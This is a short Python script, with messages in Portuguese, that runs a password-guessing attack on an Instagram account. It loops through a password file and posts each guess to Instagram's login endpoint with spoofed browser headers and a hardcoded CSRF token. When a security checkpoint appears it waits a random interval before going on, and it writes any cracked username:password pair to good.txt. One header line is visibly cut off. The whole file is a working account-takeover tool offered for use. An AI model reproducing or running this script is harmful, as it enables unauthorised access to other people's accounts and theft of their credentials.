import requests
from time import sleep
from datetime import datetime
import random

def brute_force_instagram(username, password_file):
    login_url = 'https://www.instagram.com/accounts/login/ajax/'
    with open(password_file, encoding='utf-8') as file:
        passwords = file.read().splitlines()

    for password in passwords:
        time = int(datetime.now().timestamp())
        payload = {
            'username': username,
            'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{time}:{password}',
            'queryParams': {},
            'optIntoOneTap': 'false'
        }

        with requests.Session() as session:
            try:
                response = session.post(login_url, data=payload, headers={
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.3>                    "X-Requested-With": "XMLHttpRequest",
                    "Referer": "https://www.instagram.com/accounts/login/",
                    "x-csrftoken": 'ZxKmz4hXp6XKmTPg9lzgYxXN4sFr2pzo'
                })

                if 'checkpoint_url' in response.text:
                    print(f"{username} : {password} --> Acesso restrito detectado (checkpoint)")
                    sleep(random.randint(10, 20))
                elif 'userId' in response.text:
                    print(f"{username} : {password} --> Senha correta encontrada!")
                    with open('good.txt', 'a', encoding='utf-8') as x:
                        x.write(f"{username}:{password}\n")
                        return True
                elif 'error' in response.text:
                    print(f"{username} : {password} --> Erro na solicitação")
                else:
                    print(f"{username} : {password} --> Senha incorreta")

            except requests.exceptions.RequestException:
                print("Erro na conexão. Tentando novamente...")
                sleep(random.randint(5, 10))

    return False

if __name__ == "__main__":
    username = input("Usernames => ")
    password_file = "senhas.txt"

    if not brute_force_instagram(username, password_file):
        print("Infelizmente, nenhuma senha correta foi encontrada.")
